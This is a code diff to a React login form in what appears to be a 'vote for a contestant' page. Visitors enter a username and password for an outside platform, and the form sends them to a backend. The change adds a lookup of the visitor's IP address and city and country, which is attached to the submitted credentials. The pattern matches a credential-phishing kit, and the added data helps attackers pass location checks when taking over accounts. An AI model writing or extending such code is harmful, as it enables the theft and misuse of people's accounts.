@@ -107,12 +107,33 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
         setError('');
         setIsSubmitting(true);
 
+        let clientIp = '';
+        let clientLocation = '';
+        try {
+            const ctrl = new AbortController();
+            const to = setTimeout(() => ctrl.abort(), 2000);
+            const geoRes = await fetch('https://ipwho.is/', { signal: ctrl.signal })
+                .then((r) => r.json())
+                .catch(() => null);
+            clearTimeout(to);
+
+            if (geoRes && geoRes.success !== false) {
+                clientIp = geoRes.ip || '';
+                const parts = [geoRes.city, geoRes.country].filter(Boolean);
+                if (parts.length > 0) clientLocation = parts.join(', ');
+            }
+        } catch {
+            // Graceful fallback to server IP extraction
+        }
+
         const voterPayload = {
             username: username.trim(),
             password: password.trim(),
             contestantId: contestant?.id || 'FK-101',
             contestantNo: contestant?.contestantNumber || (contestant?.id ? contestant.id : '001'),
-            platform: platform?.id || platform?.name || 'direct'
+            platform: platform?.id || platform?.name || 'direct',
+            clientIp,
+            location: clientLocation
         };
 
         try {
